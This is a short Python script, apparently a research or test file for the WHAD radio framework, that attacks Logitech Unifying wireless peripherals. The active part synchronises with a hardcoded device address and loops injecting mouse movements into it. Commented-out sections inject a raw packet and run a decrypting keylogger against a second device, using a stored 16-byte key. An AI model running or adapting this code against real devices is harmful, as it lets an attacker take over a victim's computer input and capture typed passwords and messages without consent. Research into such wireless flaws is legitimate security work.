from whad.unifying import Keylogger, Mouselogger, Mouse
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.scapy.layers.esb import *
from whad.scapy.layers.unifying import *
from scapy.compat import raw
import sys,time

def show(pkt):
    print(repr(pkt))

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            connector = Mouse(dev)
            connector.attach_callback(show)
            connector.start()
            connector.address = "ca:e9:06:ec:a4"
            connector.synchronize()
            

            '''
            for _ in range(50):
                connector.send(ESB_Hdr(bytes.fromhex("aacae906eca42b0061010000000000001e0c7000")), channel=71)
                print("ok")
                time.sleep(1)
            '''
            while True:
                print("move")
                connector.move(20, -1)
                time.sleep(0.1)
            '''
            connector = Keylogger(dev)
            connector.address = "9b:0a:90:42:8c"
            connector.scanning = True
            connector.decrypt = True

            connector.add_key(bytes.fromhex("08f59b42da6fdc9bcd88654d5f19400d"))
            connector.start()
            out = ""
            for i in connector.sniff():
                out += i
                print(out)
            '''
            while True:
                input()

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
